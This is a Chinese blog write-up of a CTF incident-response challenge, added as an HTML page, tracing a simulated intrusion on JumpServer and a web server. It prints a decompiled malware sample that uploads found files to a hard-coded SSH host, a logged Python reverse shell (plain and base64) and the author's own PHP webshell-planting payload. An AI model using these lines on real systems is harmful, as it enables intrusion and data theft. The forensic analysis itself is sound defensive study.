@@ -1,0 +1,786 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第一届帕鲁杯-CTF应急响应挑战赛部分wp | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content=" 赛题：https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y 赛题文件：应急响应模块说明手册.pdf 应急响应模块说明手册.pdf..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2024/04/19/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-3Z9EQ7RWNS')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第一届帕鲁杯-CTF应急响应挑战赛部分wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/第一届帕鲁杯-CTF应急响应挑战赛部分wp/image-20240423085916686.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">第一届帕鲁杯-CTF应急响应挑战赛部分wp</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第一届帕鲁杯-CTF应急响应挑战赛部分wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-19T05:40:17.000Z" title="发表于 2024-04-19 13:40:17">2024-04-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-06T01:00:51.436Z" title="更新于 2024-05-06 09:00:51">2024-05-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3,936</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085916686.png" alt="image-20240423085916686"></p>
+<p>赛题：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y">https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y</a></p>
+<p>赛题文件：<a href="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E%E6%89%8B%E5%86%8C.pdf">应急响应模块说明手册.pdf </a>应急响应模块说明手册.pdf </p>
+<h2 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应-1"></a>应急响应-1</h2><p><strong>题目要求：</strong><br>找到JumpServer堡垒机中flag标签的值。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[堡垒机中flag标签的值]</p>
+<p>登上jumpserver就可以了<br>点控制台的更多选项里面有个标签值即可</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419135123741.png" alt="image-20240419135123741"></p>
+<h2 id="应急响应-2"><a href="#应急响应-2" class="headerlink" title="应急响应-2"></a>应急响应-2</h2><p><strong>题目要求：</strong><br>提交攻击者第一次登录时间。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]<br>找到日志审计，查看登录日志，选一下时间，近一年的，</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422091737237.png" alt="image-20240422091737237"></p>
+<p>ip为192.168.20.123的时间</p>
+<blockquote>
+<p>flag : [2024/04/11/14:21:18]</p>
+</blockquote>
+<h2 id="应急响应-3"><a href="#应急响应-3" class="headerlink" title="应急响应-3"></a>应急响应-3</h2><p><strong>题目要求：</strong><br>提交攻击者源IP。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[0.0.0.0]</p>
+<p>因为后面test01的用户执行了jump server的rce，可能是nat转过来的</p>
+<blockquote>
+<p>flag:192.168.1.4</p>
+</blockquote>
+<h2 id="应急响应-4"><a href="#应急响应-4" class="headerlink" title="应急响应-4"></a>应急响应-4</h2><p><strong>题目要求：</strong><br>提交攻者使用的cve编号。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[CVE-0000-0000]</p>
+<p>在审计台的日志审计中，有一个作业日志</p>
+<p>test执行了两个rce</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422092914024.png" alt="image-20240422092914024"></p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422093117730.png" alt="image-20240422093117730"></p>
+<p>有两个，都试一下</p>
+<blockquote>
+<p>flag: CVE-2024-29201</p>
+</blockquote>
+<h2 id="应急响应-5"><a href="#应急响应-5" class="headerlink" title="应急响应-5"></a>应急响应-5</h2><p><strong>题目要求：</strong><br>提交攻击者留在Web服务器上的恶意程序的32位小写md5值。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxxxx]</p>
+<p>由题意可知，web服务器在 192.168.20.121上面，但是 192.168.20.121的服务器账号密码是没有给的我们可以在jump上面看一下历史命令，在资产列表里面登录，看历史命令，搜一下passwd shadow等等</p>
+<p>第一条可以看到palu.com的hash等等<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422095000280.png" alt="image-20240422095000280"></p>
+<p>但是这个palu.com的hash不全，裂开<br>我们这里其实可以直接用diskgeninus将server的盘导进来，直接看文件<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113122397.png" alt="image-20240422113122397"></p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113314688.png" alt="image-20240422113314688"></p>
+<p>直接跑hash,palu.com/123123<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134343810.png" alt="image-20240422134343810"></p>
+<p>webserver上有计算过home文件</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134415059.png" alt="image-20240422134415059"></p>
+<p>在root下面也可以找到home文件，计算一下即可</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422135155298.png" alt="image-20240422135155298"></p>
+<p>这里知道账号密码直接ssh连上来，在222端口</p>
+<blockquote>
+<p>flag:84413332e4e7138adc5d6f1f688ddd69</p>
+</blockquote>
+<h2 id="应急响应-6"><a href="#应急响应-6" class="headerlink" title="应急响应-6"></a>应急响应-6</h2><p><strong>题目要求：</strong><br>分析恶意程序连接地址和密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(地址)-md5(密码)] md5值为全小写32位长度</p>
+<p>抄人家的wp发现是一个python的linux文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: palucomeyi1.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_in_files</span>(<span class="params">directory, search_text</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span></span><br><span class="line">    hostname = <span class="string">&#x27;82.157.238.111&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;1qaz@WSX3edc&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>82.157.238.111 1qaz@WSX3edc</p>
+</blockquote>
+<h2 id="应急响应-7"><a href="#应急响应-7" class="headerlink" title="应急响应-7"></a>应急响应-7</h2><p><strong>题目要求：</strong><br>提交存在反序列化漏洞的端口。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(端口)]</p>
+<p>登录雷池的waf可以看到fastjson的端口</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422100949500.png" alt="image-20240422100949500"></p>
+<p>上游地址是8080，映射到雷池的7878，所以本身是8080端口</p>
+<blockquote>
+<p>flag:8080的md5</p>
+</blockquote>
+<h2 id="应急响应-8"><a href="#应急响应-8" class="headerlink" title="应急响应-8"></a>应急响应-8</h2><p><strong>题目要求：</strong><br>提交攻击者使用的后门路由地址。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(/api/xxx)]<br>我们在jump上翻一翻，可以看到有一个log.txt，也是不全的，当时做题的时候，没有webserver的密码，那么就看不了<br>翻那个waf的时候，可以看到有命令执行的后门，然后索性，把雷池waf所有的安全都关掉，直接写个马进去，连上，直接翻log的txt就可以了。当然，这样肯定不是预期解。<br><code>?123=system(&quot;echo &#39;&lt;?php eval(\$_POST[1]); ?&gt;&#39; &gt; a.php&quot;);</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422101901120.png" alt="image-20240422101901120"></p>
+<p>可以看到文件名为flask，那么可能就是py文件了<br>全盘搜，没有搜到，应该是删了<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422102029282.png" alt="image-20240422102029282"></p>
+<p>回到jump里面搜命令，可以看到有接口system</p>
+<blockquote>
+<p>flag:/api/system的md5</p>
+</blockquote>
+<h2 id="应急响应-9"><a href="#应急响应-9" class="headerlink" title="应急响应-9"></a>应急响应-9</h2><p><strong>题目要求：</strong><br>提交dnslog反弹域名。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(域名)]</p>
+<p>log日志中有</p>
+<blockquote>
+<p>flag:0vqkht.dnslog.cn</p>
+</blockquote>
+<h2 id="应急响应-10"><a href="#应急响应-10" class="headerlink" title="应急响应-10"></a>应急响应-10</h2><p><strong>题目要求：</strong><br>提交第一次扫描器使用时间。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]</p>
+<p>这里第一次扫描器的时间，感觉是<br> 2024/04/17 08:59:18</p>
+<p> 2024/04/17 08:59:00<br>这两个，为什么呢</p>
+<table>
+<thead>
+<tr>
+<th>./fscan -h 192.168.20.0/24</th>
+<th>接受</th>
+<th>Administrator(admin)</th>
+<th>192.168.1.4</th>
+<th>WebServer(192.168.20.121)</th>
+<th>home(home)</th>
+<th>转到</th>
+<th>2024/04/17 08:59:18</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>`$ ./fscan  -h 192.168.20.0/24 ./fscan  -h 192.168.20.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___</td>
+<td></td>
+<td>__  / /<em>/</em>___/ __</td>
+<td>/ __</td>
+<td>‘__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.3 start infoscan (icmp) Target 192.168.20.121  is alive (icmp) Target 192.168.20.2    is alive (icmp) Target 192.168.20.1    is alive (icmp) Target 192.168.20.11   is alive (icmp) Target 192.168.20.51   is alive (icmp) Target 192.168.20.52   is alive (icmp) Target 192.168.20.123  is alive [*] Icmp alive hosts len is: 7</code></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>./fscan</th>
+<th>接受</th>
+<th>Administrator(admin)</th>
+<th>192.168.1.4</th>
+<th>WebServer(192.168.20.121)</th>
+<th>home(home)</th>
+<th>转到</th>
+<th>2024/04/17 08:59:00</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>`$ ./fscan ./fscan    ___                              _      / _ \     ___  ___ _ __ __ _  ___</td>
+<td></td>
+<td>__  / /<em>/</em>___/ __</td>
+<td>/ __</td>
+<td>‘__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                    fscan version: 1.8.3 Host is none Usage of ./fscan:  -br int Brute threads (default 1)  -c string exec command (ssh|wmiexec)  -cookie string set poc cookie,-cookie rememberMe=login  -debug int every time to LogErr (default 60)  -dns using dnslo...c  -domain string smb domain  -full</code></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>00那个是执行了fscan，19那个是扫了，不知道是哪一个，也有可能就不是fscan这个扫描器，是waf那边的，但是也不是，回头看看wp</p>
+<p>果然，不是这个fscan的，是flask的日志</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111931975.png" alt="image-20240422111931975"></p>
+<p>19结尾就是，算一下</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422112133952.png" alt="image-20240422112133952"></p>
+<blockquote>
+<p>flag:[2024/04/15/02:26:59]</p>
+</blockquote>
+<h2 id="应急响应-11"><a href="#应急响应-11" class="headerlink" title="应急响应-11"></a>应急响应-11</h2><p><strong>题目要求：</strong><br>提交攻击者反弹shell使用的语言。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(c++&amp;java)]均为小写</p>
+<p>往下滑，python的</p>
+<p>1713120249.5091295—–import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘82.157.238.174’,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(‘sh’)<br>1713120301.6446397—–pcntl_exec(‘/usr/bin/python’,[‘-c’,base64_decode(‘aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjgyLjE1Ny4yMzguMTc0Iiw3ODkwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==’)]);</p>
+<blockquote>
+<p>flag:python</p>
+</blockquote>
+<h2 id="应急响应-12"><a href="#应急响应-12" class="headerlink" title="应急响应-12"></a>应急响应-12</h2><p><strong>题目要求：</strong><br>提交攻击者反弹shell的ip。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx.xxx.xxx.xxx]</p>
+<p>解一下base64<br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“82.157.238.174”,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“sh”)</p>
+<blockquote>
+<p>flag:82.157.238.174</p>
+</blockquote>
+<h2 id="应急响应-13"><a href="#应急响应-13" class="headerlink" title="应急响应-13"></a>应急响应-13</h2><p><strong>题目要求：</strong><br>提交攻击者留下的账号。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxxx]</p>
+<p>攻击者的账号已经看到了，就是palu.com</p>
+<blockquote>
+<p>flag:palu.com</p>
+</blockquote>
+<h2 id="应急响应-14"><a href="#应急响应-14" class="headerlink" title="应急响应-14"></a>应急响应-14</h2><p><strong>题目要求：</strong><br>提交攻击者的后门账户密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(password)]</p>
+<p>密码这里已经知道了，我用hashcat没有跑出来，john出来的</p>
+<blockquote>
+<p>123123</p>
+</blockquote>
+<h2 id="应急响应-15"><a href="#应急响应-15" class="headerlink" title="应急响应-15"></a>应急响应-15</h2><p><strong>题目要求：</strong><br>提交测试数据条数。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(xxx)]</p>
+<p>这里测试数据竟然是注册的数据，裂开，交代的不清楚<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422140416744.png" alt="image-20240422140416744"></p>
+<blockquote>
+<p>flag:5</p>
+</blockquote>
+<h2 id="应急响应-16"><a href="#应急响应-16" class="headerlink" title="应急响应-16"></a>应急响应-16</h2><p><strong>题目要求：</strong><br>请提交攻击者留下的信息。</p>
+<hr>
+<p><strong>提交格式：</strong><br>flag{xxx}</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422103647429.png" alt="image-20240422103647429"></p>
